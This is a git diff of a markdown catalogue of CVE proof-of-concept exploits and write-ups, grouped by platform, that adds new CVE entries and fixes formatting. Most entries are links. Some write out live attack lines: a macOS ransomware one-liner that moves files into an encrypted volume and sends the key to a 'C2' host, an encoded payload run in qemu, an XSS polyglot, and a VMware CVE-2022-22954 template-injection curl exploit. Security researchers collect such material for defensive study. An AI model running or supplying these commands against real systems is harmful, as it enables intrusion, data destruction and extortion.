@@ -50,6 +50,7 @@ Some CVEs PoCs repos on github or internet.
 - [Privilege escalation with polkit: How to get root on Linux with a seven-year-old bug](https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug/)
 - Remote Linux Kernel Heap Overflow | TIPC Module Allows Arbitrary Code Execution: [CVE-2021-43267](https://www.sentinelone.com/labs/tipc-remote-linux-kernel-heap-overflow-allows-arbitrary-code-execution/)
 - PoC for [CVE-2021-4034](https://seclists.org/oss-sec/2022/q1/80): [blasty-vs-pkexec.c](https://haxx.in/files/blasty-vs-pkexec.c)
+- Linux Kernel Exploit with mqueue: [CVE-2022-32250](https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/).
 
 ## Solaris
 
@@ -94,13 +95,13 @@ Some CVEs PoCs repos on github or internet.
 - Analysis of Recently Fixed IE Zero-Day: [CVE-2020-1380](https://www.trendmicro.com/en_us/research/20/h/cve-2020-1380-analysis-of-recently-fixed-ie-zero-day.html)
 - [MIcrosoft-Word-Use-After-Free](https://github.com/whiteHat001/MIcrosoft-Word-Use-After-Free) - Word Docx with exploit.
 - [Half Life 1](https://hackerone.com/reports/832750) - Buffer overflow In hl.exe's launch -game argument allows an attacker to execute arbitrary code locally or from browser
-- [PoC for enabling wdigest to bypass credential guard ](https://gist.github.com/N4kedTurtle/8238f64d18932c7184faa2d0af2f1240)
+- [PoC for enabling wdigest to bypass credential guard](https://gist.github.com/N4kedTurtle/8238f64d18932c7184faa2d0af2f1240)
 - Zerologon exploit Test tool for: [CVE-2020-1472](https://github.com/SecuraBV/CVE-2020-1472/) [paper](https://www.secura.com/blog/zero-logon) [PoC exploit](https://github.com/dirkjanm/CVE-2020-1472/). Another tools: [ze0Dump](https://github.com/bb00/zer0dump), [SharpZeroLogon](https://github.com/nccgroup/nccfsas/) - [From Lares Labs: Defensive Guidance for ZeroLogon](https://www.lares.com/blog/from-lares-labs-defensive-guidance-for-zerologon-cve-2020-1472/), [another exploit](https://github.com/BC-SECURITY/Invoke-ZeroLogon), [A different way of abusing Zerologon (CVE-2020-1472)](https://dirkjanm.io/a-different-way-of-abusing-zerologon/) [ZeroLogon detected by Microsoft Defender for Identity](https://techcommunity.microsoft.com/t5/microsoft-365-defender/zerologon-is-now-detected-by-microsoft-defender-for-identity-cve/ba-p/1734034), [Invoke-ZeroLogon](https://github.com/BC-SECURITY/Invoke-ZeroLogon)
 - [CobaltStrike-BOF](https://github.com/Yaxser/CobaltStrike-BOF): Collection of beacon BOF written to learn windows and cobaltstrike
 - Kerberos Bronze Bit Attack – Practical Exploitation: [CVE-2020-17049](https://blog.netspi.com/cve-2020-17049-kerberos-bronze-bit-attack/)
 - Windows SMB Information Disclousure Analysis [CVE-2020-17140](https://blogs.360.cn/post/CVE-2020-17140-Analysis.html)
 - BitLocker Lockscreen bypass: [CVE-2020-1398](https://secret.club/2021/01/15/bitlocker-bypass.html)
-- Local Privilege Escalation vulnerability found in Dell SupportAssist: [CVE-2021-21518](https://twitter.com/buffaloverflow/status/1369692589193039874) [article]()https://research.nccgroup.com/2021/03/10/technical-advisory-dell-supportassist-local-privilege-escalation-cve-202-21518/
+- Local Privilege Escalation vulnerability found in Dell SupportAssist: [CVE-2021-21518](https://twitter.com/buffaloverflow/status/1369692589193039874) [article](https://research.nccgroup.com/2021/03/10/technical-advisory-dell-supportassist-local-privilege-escalation-cve-202-21518/)
 - ProxyLogon: [CVE-2021-26855](https://github.com/hausec/ProxyLogon) [another](https://web.archive.org/web/20210310164403/https://gist.github.com/testanull/fabd8eeb46f120c4b15f8793617ca7d1)
 - Zero-day vulnerability in Desktop Window Manager: [CVE-2021-28310](https://securelist.com/zero-day-vulnerability-in-desktop-window-manager-cve-2021-28310-used-in-the-wild/101898/)
 - Windows kernel zero-day exploi: [CVE-2021-1732](https://ti.dbappsecurity.com.cn/blog/index.php/2021/02/10/windows-kernel-zero-day-exploit-is-used-by-bitter-apt-in-targeted-attack/)
@@ -134,6 +135,8 @@ Some CVEs PoCs repos on github or internet.
 - noPac: [CVE-2021-42287/CVE-2021-42278](https://github.com/cube0x0/noPac) - Scanner & Exploiter.
 - An unpatched information disclosure in Microsoft Windows [CVE-2021-24084](https://halove23.blogspot.com/2021/06/CVE-2021-24084-Unpatched-ID.html)
 - http.sys [CVE-2022-21907](https://github.com/nu11secur1ty/Windows10Exploits/commit/2a69a39a33d78c35f47d9bc3d6bf8d0ae9301266)
+- Group Policy Folder Redirection: [CVE-2021-26887](https://decoder.cloud/2022/04/27/group-policy-folder-redirection-cve-2021-26887/)
+- Unitialized pointer free in RMSRoamingSecurity Remote Code Execution: [CVE-2022-21974](https://github.com/0vercl0k/CVE-2022-21974), [other](https://github.com/0vercl0k/CVE-2022-21971)
 
 ## macOS/iOS
 
@@ -156,10 +159,12 @@ Some CVEs PoCs repos on github or internet.
 - [CVE-2020-9934](https://github.com/mattshockl/CVE-2020-9934)
 - [Stealing local files using Safari Web Share API](https://blog.redteam.pl/2020/08/stealing-local-files-using-safari-web.html) [PoC](https://overflow.pl/webshare/poc1.html)
 - xnu local privilege escalation via [os x 10.10.5 kernel local privilege escalation](https://github.com/kpwn/tpwn)
-- [MacOS Ransomware in one tweet](https://twitter.com/lordx64/status/1314614366361264130): 
+- [MacOS Ransomware in one tweet](https://twitter.com/lordx64/status/1314614366361264130):
+
   ```sh
   sh -c 'p=$(head -n 1024 /dev/urandom | strings| grep -o "[[:alnum:]]" | head -n 64| tr -d "\n"); diskutil apfs addVolume disk1 APFS x -passphrase "$p"; rsync -zvh --remove-source-files ~/exfil/* /Volumes/x; diskutil umount x; curl -0 http://C2/"$p"'
   ```
+
 - [Don't Share Your $HOME with Untrusted Guests](https://zerodayengineering.com/blog/dont-share-your-home.html). [PoC](https://github.com/badd1e/Proof-of-Concept/tree/main/prl_not0day): This proof-of-concept demonstrates a trivial no-bug, by-design virtual machine guest-to-host escape with full arbitrary code execution on the current version of Parallels Desktop for Mac.
 - [Patch Gapping a Safari Type Confusion](https://blog.theori.io/research/webkit-type-confusion/)
 - [WebContent->EL1 LPE: OOBR in AppleCLCD / IOMobileFrameBuffer](https://saaramar.github.io/IOMobileFrameBuffer_LPE_POC/): [CVE-2021-30807](https://github.com/saaramar/IOMobileFrameBuffer_LPE_POC)
@@ -176,9 +181,9 @@ Some CVEs PoCs repos on github or internet.
 
 - Spring Data Commons: [CVE-2018-1273](https://gist.github.com/matthiaskaiser/bfb274222c009b3570ab26436dc8799e)
 - Log4Shell Shitshow:
-  - Log4j 2 Vulnerability Analysis: [CVE-2021-44228](https://www.randori.com/blog/cve-2021-44228/) 
-  - [log4j-scan](https://github.com/fullhunt/log4j-scan): A fully automated, accurate, and extensive scanner for finding log4j RCE CVE-2021-44228. 
-  - [Log4j-RCE-Scanner](https://github.com/adilsoybali/: Log4j-RCE-Scanner): Remote command execution vulnerability scanner for Log4j. 
+  - Log4j 2 Vulnerability Analysis: [CVE-2021-44228](https://www.randori.com/blog/cve-2021-44228/)
+  - [log4j-scan](https://github.com/fullhunt/log4j-scan): A fully automated, accurate, and extensive scanner for finding log4j RCE CVE-2021-44228.
+  - [Log4j-RCE-Scanner](https://github.com/adilsoybali/): Log4j-RCE-Scanner - Remote command execution vulnerability scanner for Log4j.
   - [CVE-2021-44228-Log4Shell-Hashes](https://github.com/mubix/CVE-2021-44228-Log4Shell-Hashes)
   - [Apache Log4j RCE Attempts](https://gist.github.com/gnremy/c546c7911d5f876f263309d7161a7217)
   - [CVE-2021-44228-PoC-log4j-bypass-words](https://github.com/Puliczek/CVE-2021-44228-PoC-log4j-bypass-words): CVE-2021-44228 - LOG4J Java exploit - A trick to bypass words blocking patches.
@@ -308,7 +313,7 @@ Some CVEs PoCs repos on github or internet.
 - Say Cheese: [Ransomware-ing a DSLR Camera](https://research.checkpoint.com/say-cheese-ransomware-ing-a-dslr-camera/) -
 
 ```bash
-$ echo H4sICH0mqFkAA3BvYwDbweS/W8LxrMCuK8wbZN85bWh494VhFIwUELoKAIJvFIwAAgAA | base64 -d | gunzip > a && qemu-system-i386 -vga cirrus a
+ echo H4sICH0mqFkAA3BvYwDbweS/W8LxrMCuK8wbZN85bWh494VhFIwUELoKAIJvFIwAAgAA | base64 -d | gunzip > a && qemu-system-i386 -vga cirrus a
 ```
 
 - Elasticsearch Kibana Console [CVE-2018-17246](https://twitter.com/IM_23pds/status/1074627634150006784) PoC：
@@ -337,7 +342,7 @@ javascript:"/*'/*`/*--><html \" onmouseover=/*&lt;svg/*/onload=alert()//>
 - [Richsploit](https://github.com/redtimmy/Richsploit): [One tool to exploit all versions of RichFaces ever released](https://www.redtimmy.com/java-hacking/richsploit-one-tool-to-exploit-all-versions-of-richfaces-ever-released/) [CVE-2018-14667](https://github.com/syriusbughunt/CVE-2018-14667)
 - Forget Your Perimeter - RCE in Pulse Connect Secure: [CVE-2020-8218](https://www.gosecure.net/blog/2020/08/26/forget-your-perimeter-rce-in-pulse-connect-secure/).
 - [Pulse Connect Secure Samba buffer overflow](https://www.kb.cert.org/vuls/id/667933): [cve- 2021-22908](https://github.com/CERTCC/PoC-Exploits/tree/master/cve-2021-22908)
-- some Starlabs [CVES](https://twitter.com/starlabs_sg/status/1299886166406127617): 
+- some Starlabs [CVES](https://twitter.com/starlabs_sg/status/1299886166406127617):
   - [CVE-2020-2674](https://starlabs.sg/advisories/20-2674/)
   - [CVE-2020-2682](https://starlabs.sg/advisories/20-2682/)
   - [CVE-2020-2575](https://starlabs.sg/advisories/20-2575/)
@@ -351,17 +356,19 @@ javascript:"/*'/*`/*--><html \" onmouseover=/*&lt;svg/*/onload=alert()//>
 - [cve-scanner-exploiting-pocs](https://github.com/gmatuz/cve-scanner-exploiting-pocs): Collection of ideas and specific exploits against Docker CVE scanners
 - [Docker Escape Tool](https://github.com/PercussiveElbow/docker-escape-tool): Tool to test if you're in a Docker container and attempt simple breakouts
 - [AT-TFTP_Long_Filename](https://github.com/Re4son/AT-TFTP_Long_Filename): Exploits a stack buffer overflow in AT-TFTP v1.9, by sending a request (get/write) for an overly long file name.
-- [The Anatomy of a Bug Door: Dissecting Two D-Link Router Authentication Bypasses](https://www.zerodayinitiative.com/blog/2020/9/30/the-anatomy-of-a-bug-door-dissecting-two-d-link-router-authentication-bypasses), CVEs CVE-2020-8863 and CVE-2020-8864. [dsp-w215-hnap](https://github.com/bikerp/dsp-w215-hnap): Tool for reading data from D-Link DSP-W215 Smart Plug 
+- [The Anatomy of a Bug Door: Dissecting Two D-Link Router Authentication Bypasses](https://www.zerodayinitiative.com/blog/2020/9/30/the-anatomy-of-a-bug-door-dissecting-two-d-link-router-authentication-bypasses), CVEs CVE-2020-8863 and CVE-2020-8864. [dsp-w215-hnap](https://github.com/bikerp/dsp-w215-hnap): Tool for reading data from D-Link DSP-W215 Smart Plug
 - [An Exercise in Practical Container Escapology](https://capsule8.com/blog/practical-container-escape-exercise/)
 - [VMware vCenter 6.5u1](https://twitter.com/ptswarm/status/1316016337550938122)
 - The vSphere Client (HTML5) contains a remote code execution vulnerability due to lack of input validation in the Virtual SAN Health Check plug-in which is enabled by default in vCenter Server: [CVE-2021-21985](https://github.com/alt3kx/CVE-2021-21985_PoC)
 - VMware vCenter Server: [CVE-2021-21985](https://github.com/alt3kx/CVE-2021-21985_PoC)
+- Exploit for VMware Workspace ONE Access: [CVE-2022-22954](https://twitter.com/wvuuuuuuuuuuuuu/status/1519476924757778433) ```curl -kv https://192.168.0.240/catalog-portal/ui/oauth/verify -H "Host: lol" -Gd error= --data-urlencode 'deviceUdid=${"freemarker.template.utility.Execute"?new()("bash -c {eval,$({echo,aWQ7dW5hbWUgLWE=}|{base64,-d})}")}'```
+  - [POC](https://github.com/sherlocksecurity/VMware-CVE-2022-22954)
 - [Unauthenticated Full-Read SSRF in Grafana](https://rhynorater.github.io/CVE-2020-13379-Write-Up): CVE-2020-13379
 - [Cisco Security Manager PoCs](https://gist.github.com/Frycos/8bf5c125d720b3504b4f28a1126e509e)
 - UK NCSC’s alert urges orgs to fix MobileIron: [CVE-2020-15505](https://securityaffairs.co/wordpress/111426/uncategorized/mobileiron-cve-2020-15505-alert.html)
 - [CSM_Pocs](https://gist.github.com/magnologan/3d0d24c2d0af7d3f27344fcb14eb8f7e): Cisco Security Manager is an enterprise-class security management application that provides insight into and control of Cisco security and network devices. [CSM_pocs](https://gist.github.com/Frycos/8bf5c125d720b3504b4f28a1126e509e).
 - [Fortiscan](https://github.com/anasbousselham/fortiscan) (CVE-2018-13379): A high performance FortiGate SSL-VPN vulnerability scanning and exploitation tool.
-- FortiOS system file leak through SSL VPN via specially crafted HTTP resource requests: [CVE-2018-13379](https://github.com/Zeop-CyberSec/fortios_vpnssl_traversal_leak): This module massively scan and exploit a path traversal vulnerability in the FortiOS SSL VPN web portal may allow an unauthenticated attacker to download FortiOS system files through specially crafted HTTP resource requests (CVE-2018-13379). 
+- FortiOS system file leak through SSL VPN via specially crafted HTTP resource requests: [CVE-2018-13379](https://github.com/Zeop-CyberSec/fortios_vpnssl_traversal_leak): This module massively scan and exploit a path traversal vulnerability in the FortiOS SSL VPN web portal may allow an unauthenticated attacker to download FortiOS system files through specially crafted HTTP resource requests (CVE-2018-13379).
 - [FortiWeb CVE](https://twitter.com/ptswarm/status/1346806951326396416)
 - [Use-After-Free IE Vulnerability](https://www.trendmicro.com/en_us/research/20/k/cve-2020-17053-use-after-free-ie-vulnerability.html): CVE-2020-17053
 - Cisco ASA: [CVE-2020-3452](https://github.com/cygenta/CVE-2020-3452)
@@ -374,6 +381,7 @@ javascript:"/*'/*`/*--><html \" onmouseover=/*&lt;svg/*/onload=alert()//>
 - [Mozilla Firefox 88.0.1 - File Extension Execution of Arbitrary Code Exploit](https://0day.today/exploit/36279?__cf_chl_jschl_tk__=pmd_G6m29yFpEw91HdgyhDqA_fgK9zfS4xJgwU6RmcAM_xI-1635293730-0-gqNtZGzNAhCjcnBszQhl) [“CONTENT-TYPE CONFUSION” – UNSAFE CODE EXECUTION](https://besteffortteam.it/mozilla-firefox-content-type-confusion-unsafe-code-execution/)
 - [Zoom RCE from Pwn2Own 2021](https://sector7.computest.nl/post/2021-08-zoom/)
 - GHSL-2021-102: ReDoS (Regular Expression Denial of Service) in Fluentd - [CVE-2021-41186](https://securitylab.github.com/advisories/GHSL-2021-102-fluent-fluentd/)
+- WSO2 RCE exploit and writeup: [CVE-2022-29464](https://github.com/hakivvi/CVE-2022-29464)
 
 ## Additions
 
